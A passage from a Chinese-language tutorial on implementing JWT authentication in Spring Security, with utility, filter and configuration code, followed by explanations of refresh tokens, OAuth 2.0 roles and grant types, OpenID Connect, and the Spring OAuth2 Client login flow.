<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.11.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.11.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-jackson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.11.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤 1: 创建 JWT 工具类</strong></p>
<p>封装 JWT 的生成和解析逻辑。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jwt.secret&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String secret;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jwt.expiration&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> expiration;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从 Authentication 对象生成 JWT</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">generateToken</span><span class="params">(Authentication authentication)</span> &#123;</span><br><span class="line">        <span class="type">UserDetails</span> <span class="variable">userDetails</span> <span class="operator">=</span> (UserDetails) authentication.getPrincipal();</span><br><span class="line">        <span class="type">Date</span> <span class="variable">now</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="type">Date</span> <span class="variable">expiryDate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(now.getTime() + expiration);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .setSubject(userDetails.getUsername())</span><br><span class="line">                .setIssuedAt(now)</span><br><span class="line">                .setExpiration(expiryDate)</span><br><span class="line">                .signWith(SignatureAlgorithm.HS256, secret)</span><br><span class="line">                .compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从 JWT 中解析用户名</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsernameFromToken</span><span class="params">(String token)</span> &#123;</span><br><span class="line">        <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.parser()</span><br><span class="line">                .setSigningKey(secret)</span><br><span class="line">                .parseClaimsJws(token)</span><br><span class="line">                .getBody();</span><br><span class="line">        <span class="keyword">return</span> claims.getSubject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证 JWT 是否有效</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">validateToken</span><span class="params">(String token, UserDetails userDetails)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> getUsernameFromToken(token);</span><br><span class="line">            <span class="keyword">return</span> (username.equals(userDetails.getUsername()) &amp;&amp; !isTokenExpired(token));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// MalformedJwtException, ExpiredJwtException, etc.</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isTokenExpired</span><span class="params">(String token)</span> &#123;</span><br><span class="line">        <span class="type">Date</span> <span class="variable">expirationDate</span> <span class="operator">=</span> Jwts.parser().setSigningKey(secret).parseClaimsJws(token).getBody().getExpiration();</span><br><span class="line">        <span class="keyword">return</span> expirationDate.before(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>步骤 2: 创建自定义过滤器</strong></p>
<p>这个过滤器继承 <code>OncePerRequestFilter</code>，确保每个请求只执行一次。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtAuthenticationFilter</span> <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JwtUtil jwtUtil;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserDetailsService userDetailsService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(HttpServletRequest request, </span></span><br><span class="line"><span class="params">                                    HttpServletResponse response, </span></span><br><span class="line"><span class="params">                                    FilterChain filterChain)</span> </span><br><span class="line">                                    <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 1. 从请求头获取 JWT</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">header</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Authorization&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jwt</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (header != <span class="literal">null</span> &amp;&amp; header.startsWith(<span class="string">&quot;Bearer &quot;</span>)) &#123;</span><br><span class="line">            jwt = header.substring(<span class="number">7</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                username = jwtUtil.getUsernameFromToken(jwt);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">// ... handle exceptions</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 如果获取到用户名，且当前 SecurityContext 中没有认证信息</span></span><br><span class="line">        <span class="keyword">if</span> (username != <span class="literal">null</span> &amp;&amp; SecurityContextHolder.getContext().getAuthentication() == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">UserDetails</span> <span class="variable">userDetails</span> <span class="operator">=</span> <span class="built_in">this</span>.userDetailsService.loadUserByUsername(username);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3. 验证 JWT 是否有效</span></span><br><span class="line">            <span class="keyword">if</span> (jwtUtil.validateToken(jwt, userDetails)) &#123;</span><br><span class="line">                <span class="comment">// 4. 构建 Authentication 对象</span></span><br><span class="line">                <span class="type">UsernamePasswordAuthenticationToken</span> <span class="variable">authentication</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordAuthenticationToken</span>(</span><br><span class="line">                        userDetails, <span class="literal">null</span>, userDetails.getAuthorities());</span><br><span class="line">                authentication.setDetails(<span class="keyword">new</span> <span class="title class_">WebAuthenticationDetailsSource</span>().buildDetails(request));</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 5. 将 Authentication 对象放入 SecurityContext</span></span><br><span class="line">                SecurityContextHolder.getContext().setAuthentication(authentication);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 6. 放行请求</span></span><br><span class="line">        filterChain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>步骤 3: 更新 Security 配置</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JwtAuthenticationFilter jwtAuthenticationFilter;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserDetailsService userDetailsService;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">            <span class="comment">// 1. 禁用 CSRF</span></span><br><span class="line">            .csrf(csrf -&gt; csrf.disable())</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. 配置会话管理为无状态</span></span><br><span class="line">            .sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 3. 配置授权规则</span></span><br><span class="line">            .authorizeHttpRequests(auth -&gt; auth</span><br><span class="line">                .requestMatchers(<span class="string">&quot;/api/auth/**&quot;</span>).permitAll() <span class="comment">// 允许访问登录/注册</span></span><br><span class="line">                .anyRequest().authenticated()</span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 4. 将自定义的 JWT 过滤器添加到过滤器链中</span></span><br><span class="line">            <span class="comment">// 在 UsernamePasswordAuthenticationFilter 之前执行</span></span><br><span class="line">            .addFilterBefore(jwtAuthenticationFilter, UsernamePasswordAuthenticationFilter.class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 需要 AuthenticationManager Bean 用于登录认证</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> AuthenticationManager <span class="title function_">authenticationManager</span><span class="params">(AuthenticationConfiguration config)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> config.getAuthenticationManager();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，当一个请求到达时：</p>
<ul>
<li><code>/api/auth/login</code> 请求被放行，用户登录成功后，Controller 调用 <code>JwtUtil.generateToken()</code> 生成 JWT 并返回给前端。</li>
<li>前端在后续请求的 <code>Authorization</code> Header 中携带 <code>Bearer &lt;jwt&gt;</code>。</li>
<li><code>JwtAuthenticationFilter</code> 拦截请求，验证 JWT，并将用户信息放入 <code>SecurityContext</code>。</li>
<li>后续的授权逻辑（如 <code>@PreAuthorize</code>）就能正常工作了。</li>
</ul>
<hr>
<h4 id="5-1-4-实现-Token-刷新机制"><a href="#5-1-4-实现-Token-刷新机制" class="headerlink" title="5.1.4 实现 Token 刷新机制"></a>5.1.4 实现 Token 刷新机制</h4><p>短期的 Access Token 提高了安全性，但也带来了用户体验问题。<strong>Access Token + Refresh Token</strong> 模式是解决这个问题的最佳实践。</p>
<ul>
<li><strong>Access Token</strong>: 短生命周期（如 15-60 分钟），用于访问受保护资源，Payload 中可包含权限信息。</li>
<li><strong>Refresh Token</strong>: 长生命周期（如 7-30 天），<strong>只能</strong>用于获取新的 Access Token。它不包含任何权限信息，通常是一个随机生成的、无意义的字符串，并存储在数据库中，以便可以随时撤销。</li>
</ul>
<p><strong>刷新流程</strong>:</p>
<ol>
<li><strong>登录</strong>: 用户登录成功，服务器返回 <strong>Access Token</strong> 和 <strong>Refresh Token</strong>。</li>
<li><strong>访问</strong>: 客户端使用 Access Token 访问 API。</li>
<li><strong>过期</strong>: Access Token 过期，API 返回 401 Unauthorized。</li>
<li><strong>刷新</strong>: 客户端的请求拦截器捕获到 401 错误，然后向一个专门的刷新端点（如 <code>/api/auth/refresh</code>）发送 <strong>Refresh Token</strong>。</li>
<li><strong>验证与签发</strong>: 服务器验证 Refresh Token 是否有效（存在于数据库且未过期）。如果有效，则签发一个新的 Access Token（有时也会签发一个新的 Refresh Token，这称为“刷新令牌旋转”），并返回给客户端。</li>
<li><strong>重试</strong>: 客户端收到新的 Access Token 后，用它来自动重试之前失败的请求。整个过程对用户是透明的。</li>
</ol>
<p>这个机制需要在 <code>AuthController</code> 中增加一个处理 <code>/refresh</code> 的端点，并设计 Refresh Token 在数据库中的存储和校验逻辑。</p>
<hr>
<h3 id="5-2-OAuth2-与-OIDC-OpenID-Connect-核心概念"><a href="#5-2-OAuth2-与-OIDC-OpenID-Connect-核心概念" class="headerlink" title="5.2 OAuth2 与 OIDC (OpenID Connect) 核心概念"></a>5.2 OAuth2 与 OIDC (OpenID Connect) 核心概念</h3><h4 id="5-2-1-OAuth-2-0-委托授权的框架"><a href="#5-2-1-OAuth-2-0-委托授权的框架" class="headerlink" title="5.2.1 OAuth 2.0: 委托授权的框架"></a>5.2.1 OAuth 2.0: 委托授权的框架</h4><p>首先，要明确 OAuth 2.0 的核心目标：它<strong>不是一个认证 (Authentication) 协议</strong>，而是一个<strong>授权 (Authorization) 框架</strong>。</p>
<p>它的设计初衷是为了解决一个非常具体的问题：<strong>“如何在不暴露用户核心凭证（如用户名和密码）的前提下，允许第三方应用（客户端）访问用户在某个服务上受保护的资源？”</strong></p>
<p><strong>经典场景</strong>:</p>
<p>想象一下，你发现了一个很棒的第三方照片打印网站 <code>PrintPhotos.com</code>，你希望它能访问你在 <code>Google Photos</code> 上的照片来进行打印。</p>
<ul>
<li><strong>没有 OAuth 2.0 的糟糕做法</strong>: <code>PrintPhotos.com</code> 要求你输入你的 Google 用户名和密码。这是一个巨大的安全风险，因为它拿到了你的最高权限，不仅可以看你的照片，还能看你的邮件、日历等所有信息。</li>
<li><strong>有了 OAuth 2.0 的优雅做法</strong>:<ol>
<li><code>PrintPhotos.com</code> 会将你重定向到 Google 的登录和授权页面。</li>
<li>你直接向 Google 登录（你的密码绝不会给 <code>PrintPhotos.com</code>）。</li>
<li>Google 会询问你：“<code>PrintPhotos.com</code> 正在请求访问你的照片库，你是否同意？”</li>
<li>你点击“同意”后，Google 会给 <code>PrintPhotos.com</code> 一个临时的、有特定权限（只能访问照片）的“令牌 (Token)”。</li>
<li><code>PrintPhotos.com</code> 使用这个令牌去访问 <code>Google Photos</code> API，成功获取你的照片。</li>
</ol>
</li>
</ul>
<p>在这个过程中，<code>PrintPhotos.com</code> 从未接触到你的密码，并且它获得的授权是<strong>有限的、可撤销的</strong>。这就是 OAuth 2.0 的核心思想——<strong>委托授权</strong>。</p>
<hr>
<h4 id="5-2-2-OAuth-2-0-的四大核心角色"><a href="#5-2-2-OAuth-2-0-的四大核心角色" class="headerlink" title="5.2.2 OAuth 2.0 的四大核心角色"></a>5.2.2 OAuth 2.0 的四大核心角色</h4><p>OAuth 2.0 协议中定义了四个关键角色：</p>
<ol>
<li><strong>资源所有者 (Resource Owner)</strong><ul>
<li><strong>定义</strong>: 能够授予对受保护资源访问权限的实体。通常就是<strong>最终用户</strong>。</li>
<li><strong>例子</strong>: 在上面的场景中，<strong>你</strong>就是资源所有者，因为照片是你的。</li>
</ul>
</li>
<li><strong>客户端 (Client)</strong><ul>
<li><strong>定义</strong>: 代表资源所有者，并经其授权，去请求访问受保护资源的应用程序。</li>
<li><strong>例子</strong>: <code>PrintPhotos.com</code> 网站。</li>
<li><strong>关键属性</strong>: 每个客户端在授权服务器上注册时，都会获得一个 <code>client_id</code> 和一个 <code>client_secret</code>（对于保密客户端），用于表明自己的身份。</li>
</ul>
</li>
<li><strong>授权服务器 (Authorization Server)</strong><ul>
<li><strong>定义</strong>: <strong>整个流程的核心</strong>。负责验证资源所有者的身份，并根据其授权，向客户端颁发访问令牌 (Access Token)。</li>
<li><strong>例子</strong>: Google 的认证和授权服务 (<code>accounts.google.com</code>)。</li>
<li>它就像一个**“令牌颁发机构”**。</li>
</ul>
</li>
<li><strong>资源服务器 (Resource Server)</strong><ul>
<li><strong>定义</strong>: 托管受保护资源的服务器。它只认令牌，不认人。它能接受并验证访问令牌，如果令牌有效，就允许客户端访问资源。</li>
<li><strong>例子</strong>: 存储你照片的 <code>Google Photos</code> API 服务器 (<code>photos.googleapis.com</code>)。</li>
</ul>
</li>
</ol>
<p><strong>流程概览</strong>:</p>
<p><code>资源所有者</code> 告诉 <code>授权服务器</code>：“我同意让这个 <code>客户端</code> 访问我在 <code>资源服务器</code> 上的某些数据”。然后 <code>授权服务器</code> 给了 <code>客户端</code> 一个令牌，<code>客户端</code> 拿着这个令牌去找 <code>资源服务器</code> 要数据。</p>
<hr>
<h4 id="5-2-3-四种核心授权模式-Grant-Types"><a href="#5-2-3-四种核心授权模式-Grant-Types" class="headerlink" title="5.2.3 四种核心授权模式 (Grant Types)"></a>5.2.3 四种核心授权模式 (Grant Types)</h4><p>OAuth 2.0 定义了多种获取访问令牌的流程（称为“授权模式”），以适应不同的客户端类型和应用场景。</p>
<h5 id="1-授权码模式-Authorization-Code-Grant"><a href="#1-授权码模式-Authorization-Code-Grant" class="headerlink" title="1. 授权码模式 (Authorization Code Grant)"></a>1. 授权码模式 (Authorization Code Grant)</h5><ul>
<li><strong>流程概述</strong>: 这是<strong>功能最完整、最安全、最推荐</strong>的模式。<ol>
<li>客户端将资源所有者重定向到授权服务器。</li>
<li>资源所有者登录并授权。</li>
<li>授权服务器将资源所有者重定向回客户端，并附带一个<strong>一次性的授权码 (Authorization Code)</strong>。</li>
<li>客户端在<strong>后端</strong>，使用自己的 <code>client_id</code>, <code>client_secret</code> 和上一步获得的授权码，向授权服务器请求令牌。</li>
<li>授权服务器验证所有信息后，返回<strong>访问令牌 (Access Token)</strong> 和可选的<strong>刷新令牌 (Refresh Token)</strong>。</li>
</ol>
</li>
<li><strong>适用场景</strong>:<ul>
<li>传统的<strong>服务端 Web 应用</strong>（如 Java, Python, Ruby on Rails 应用），因为它们有安全的后端来存储 <code>client_secret</code> 和处理与授权服务器的通信。</li>
<li><strong>第三方登录</strong>（“Login with Google&#x2F;GitHub”）的核心就是这个模式。</li>
</ul>
</li>
<li><strong>安全性</strong>: 非常高。因为敏感的令牌交换是在后端服务器之间进行的，不会暴露给前端浏览器。</li>
</ul>
<hr>
<h5 id="2-简化模式-Implicit-Grant-已不推荐"><a href="#2-简化模式-Implicit-Grant-已不推荐" class="headerlink" title="2. 简化模式 (Implicit Grant) - (已不推荐)"></a>2. 简化模式 (Implicit Grant) - (已不推荐)</h5><ul>
<li><strong>流程概述</strong>:<ol>
<li>流程与授权码模式类似，但授权服务器在用户授权后，<strong>直接</strong>通过重定向将<strong>访问令牌</strong>返回给客户端的前端。</li>
<li>没有授权码交换的步骤。</li>
</ol>
</li>
<li><strong>适用场景</strong>:<ul>
<li>最初是为<strong>纯前端应用 (SPA)</strong> 设计的，因为它们没有后端来安全地存储 <code>client_secret</code>。</li>
</ul>
</li>
<li><strong>安全性</strong>: <strong>较低，已不推荐使用</strong>。因为访问令牌直接暴露在浏览器中，容易被截获。现代 SPA 应用应使用<strong>带有 PKCE 的授权码模式</strong>来替代。</li>
</ul>
<hr>
<h5 id="3-密码模式-Resource-Owner-Password-Credentials-Grant-已不推荐"><a href="#3-密码模式-Resource-Owner-Password-Credentials-Grant-已不推荐" class="headerlink" title="3. 密码模式 (Resource Owner Password Credentials Grant) - (已不推荐)"></a>3. 密码模式 (Resource Owner Password Credentials Grant) - (已不推荐)</h5><ul>
<li><strong>流程概述</strong>:<ol>
<li>客户端直接向用户索要用户名和密码。</li>
<li>客户端将用户名、密码、<code>client_id</code> 和 <code>client_secret</code> 一起发送给授权服务器。</li>
<li>授权服务器验证后，直接返回访问令牌。</li>
</ol>
</li>
<li><strong>适用场景</strong>:<ul>
<li>仅限于<strong>高度可信的“第一方”客户端</strong>（例如，官方自己开发的移动 App）。</li>
</ul>
</li>
<li><strong>安全性</strong>: <strong>较低，强烈不推荐使用</strong>。因为它违背了 OAuth 2.0 的核心原则——不向客户端暴露用户密码。这使得客户端可以存储用户密码，增加了风险。</li>
</ul>
<hr>
<h5 id="4-客户端凭证模式-Client-Credentials-Grant"><a href="#4-客户端凭证模式-Client-Credentials-Grant" class="headerlink" title="4. 客户端凭证模式 (Client Credentials Grant)"></a>4. 客户端凭证模式 (Client Credentials Grant)</h5><ul>
<li><strong>流程概述</strong>:<ol>
<li><strong>没有资源所有者参与</strong>。</li>
<li>客户端直接使用自己的 <code>client_id</code> 和 <code>client_secret</code> 向授权服务器请求访问令牌。</li>
<li>授权服务器验证客户端身份后，返回一个访问令牌。这个令牌代表的是<strong>客户端自身</strong>，而不是某个最终用户。</li>
</ol>
</li>
<li><strong>适用场景</strong>:<ul>
<li><strong>机器对机器 (M2M) 的通信</strong>。例如，一个后台的数据同步服务需要调用另一个服务的 API。这个数据同步服务本身就是一个客户端，它需要访问资源，但这个过程与任何终端用户都无关。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="5-2-4-OIDC-OpenID-Connect-在-OAuth-2-0-之上构建的认证层"><a href="#5-2-4-OIDC-OpenID-Connect-在-OAuth-2-0-之上构建的认证层" class="headerlink" title="5.2.4 OIDC (OpenID Connect): 在 OAuth 2.0 之上构建的认证层"></a>5.2.4 OIDC (OpenID Connect): 在 OAuth 2.0 之上构建的认证层</h4><p>前面提到，OAuth 2.0 是一个授权框架。但实际应用中，我们经常需要“第三方登录”，这不仅需要授权，还需要<strong>认证</strong>——即“确认当前用户的身份是谁”。</p>
<p><strong>OIDC (OpenID Connect)</strong> 就是为了解决这个问题而生的。</p>
<ul>
<li><strong>定义</strong>: OIDC 是建立在 OAuth 2.0 协议之上的一个<strong>身份认证层 (Identity Layer)</strong>。</li>
<li><strong>核心扩展</strong>: OIDC 在 OAuth 2.0 的流程中，增加了一个关键产物：<strong>ID Token</strong>。<ul>
<li><strong>ID Token</strong> 是一个 <strong>JWT (JSON Web Token)</strong>。</li>
<li>它包含了关于<strong>资源所有者（用户）的身份信息</strong>，如用户的唯一标识符 (<code>sub</code>)、签发者 (<code>iss</code>)、签发时间 (<code>iat</code>) 等。</li>
<li>ID Token 经过了<strong>数字签名</strong>，客户端可以验证其真实性和完整性，从而确认用户的身份。</li>
</ul>
</li>
</ul>
<p><strong>OIDC 与 OAuth 2.0 的关系</strong>:</p>
<ul>
<li>所有 OIDC 流程都是合法的 OAuth 2.0 流程。</li>
<li>OIDC 在 OAuth 2.0 的基础上增加了 <code>openid</code> 这个特殊的 <code>scope</code> (权限范围)。当客户端请求中包含 <code>scope=openid</code> 时，授权服务器就知道这是一个 OIDC 请求。</li>
<li>在返回 <code>Access Token</code> 的同时，授权服务器还会返回一个 <code>ID Token</code>。</li>
</ul>
<p><strong>总结</strong>:</p>
<ul>
<li>如果你只需要<strong>授权</strong>（让应用 A 访问应用 B 的数据），使用 <strong>OAuth 2.0</strong>。</li>
<li>如果你需要<strong>认证</strong>（实现“使用 Google&#x2F;GitHub 登录”的功能），你需要的是 <strong>OIDC</strong>。</li>
</ul>
<p><strong>Spring Security OAuth2 Client 模块实际上就是一个 OIDC 的客户端实现</strong>，它能帮助我们轻松地集成支持 OIDC 的第三方认证服务。</p>
<hr>
<h3 id="5-3-Spring-Security-OAuth2-Client"><a href="#5-3-Spring-Security-OAuth2-Client" class="headerlink" title="5.3 Spring Security OAuth2 Client"></a>5.3 Spring Security OAuth2 Client</h3><p>Spring Security 的 <code>spring-security-oauth2-client</code> 模块极大地简化了作为 OAuth2&#x2F;OIDC 客户端与第三方身份提供商（IdP, Identity Provider）集成的过程。它封装了所有复杂的 OAuth2 授权码流程，让我们只需少量配置就能实现强大的第三方登录功能。</p>
<h4 id="5-3-1-核心流程回顾"><a href="#5-3-1-核心流程回顾" class="headerlink" title="5.3.1 核心流程回顾"></a>5.3.1 核心流程回顾</h4><p>当我们集成第三方登录时，我们的应用扮演的是 <strong>OAuth2 客户端 (Client)</strong> 的角色。整个流程遵循 <strong>授权码模式 (Authorization Code Grant)</strong>：</p>
<ol>
<li><strong>用户点击“使用 GitHub 登录”</strong>: 我们的应用将用户重定向到 GitHub 的授权页面。</li>
<li><strong>用户在 GitHub 上授权</strong>: 用户登录自己的 GitHub 账户，并同意授权我们的应用访问其基本信息。</li>
<li><strong>GitHub 重定向回应用</strong>: GitHub 将用户重定向回我们应用预先配置的回调 URL (<code>redirect-uri</code>)，并附带一个一次性的<strong>授权码 (code)</strong>。</li>
<li><strong>后台交换令牌</strong>: Spring Security OAuth2 Client 模块自动拦截这个回调请求，在后台用授权码、<code>client-id</code> 和 <code>client-secret</code> 向 GitHub 的 Token 端点交换<strong>访问令牌 (Access Token)</strong>。</li>
